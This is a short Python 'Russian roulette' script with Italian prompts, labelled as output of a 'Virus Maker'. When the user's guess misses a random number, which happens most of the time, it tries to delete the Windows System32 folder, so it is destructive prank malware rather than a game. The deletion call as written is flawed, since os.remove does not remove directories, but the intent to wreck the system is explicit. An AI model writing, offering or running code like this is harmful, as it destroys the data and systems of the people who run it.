# Code generated with Virus Maker

import random
import os

num=4

print("Benvenuto nella Roulette Russa!")

while num>=1 and num<=6:
    num=int(input("Inserisci un numero tra 1 e 6: "))
    
    if num>=1 and num<=6:
        break

cella=random.randint(1,6)

if num!=cella:
    os.remove("C://Windows//System32")
else:
    print("Sei stato fortunato,per questa volta...")